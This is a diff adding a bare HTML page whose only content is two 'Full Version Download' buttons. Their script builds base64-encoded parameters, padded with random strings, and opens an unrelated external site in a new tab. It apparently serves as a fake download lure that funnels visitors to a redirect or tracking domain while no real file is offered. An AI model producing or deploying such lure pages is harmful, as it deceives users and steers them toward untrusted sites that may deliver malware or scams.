@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<style>
+    .button-container {
+        text-align: center;
+    }
+
+    .colorful-button {
+        background: linear-gradient(45deg, #ff5733, #ffcc00, #00ffcc, #007bff);
+        color: white;
+        border: none;
+        padding: 15px 30px;
+        margin: 10px;
+        cursor: pointer;
+        border-radius: 5px;
+        font-size: 16px;
+        transition: background 0.3s ease, transform 0.3s ease;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+    .colorful-button:hover {
+        background: linear-gradient(45deg, #007bff, #00ffcc, #ffcc00, #ff5733);
+        transform: scale(1.05);
+    }
+</style>
+<body>
+    <center>
+        <div class='button-container'>
+            <button class='colorful-button' onclick="handleDownload('Download')">Full Version Download</button>
+            <button class='colorful-button' onclick="handleDownload('Download 2nd Link')">Download Now</button>
+        </div>
+    </center>
+    
+    <script>
+        // Function to handle the button click event
+        function handleDownload(buttonText) {
+            const params = {
+                singer: generateRandomString(10, 30),
+                stunning: generateRandomString(7, 27),
+                p: encodeURIComponent(document.title),
+                d: 1,
+                x: 2310
+            };
+    
+            const encryptedParams = btoa(JSON.stringify(params));
+            const redirectURL = `https://nk24-5.g-site.site/index.php?params=${encodeURIComponent(encryptedParams)}`;
+            window.open(redirectURL, '_blank', 'noopener,noreferrer');
+    
+            // Log which button was clicked
+            console.log(`Button clicked: ${buttonText}`);
+        }
+    
+        // Function to generate random alphanumeric string
+        function generateRandomString(minLength, maxLength) {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+            const randomChars = Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length)));
+            return randomChars.join('');
+        }
+    </script>
+    
+    
+    
+</body>
+</html>
